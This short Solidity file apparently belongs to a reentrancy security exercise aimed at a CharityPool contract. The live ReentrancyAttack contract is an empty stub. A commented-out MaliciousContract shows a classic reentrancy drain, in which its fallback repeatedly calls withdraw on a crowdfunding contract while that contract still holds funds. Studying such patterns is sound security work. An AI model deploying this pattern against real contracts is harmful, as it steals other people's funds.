
pragma solidity ^0.5.0;


import './CharityPool.sol';

contract ReentrancyAttack {


    CharityPool public charityPool;

    constructor(address _charityPool) public {
        charityPool = CharityPool(_charityPool);
    }


}


// contract MaliciousContract {
//     Crowdfunding public crowdfunding;

//     constructor(address _crowdfundingAddress) {
//         crowdfunding = Crowdfunding(_crowdfundingAddress);
//     }

//     fallback() external payable {
//         if (address(crowdfunding).balance >= 1 ether) {
//             crowdfunding.withdraw(1 ether);
//         }
//     }

//     function initiateAttack() public {
//         crowdfunding.withdraw(1 ether);
//     }

//     function getBalance() public view returns (uint) {
//         return address(this).balance;
//     }
// }
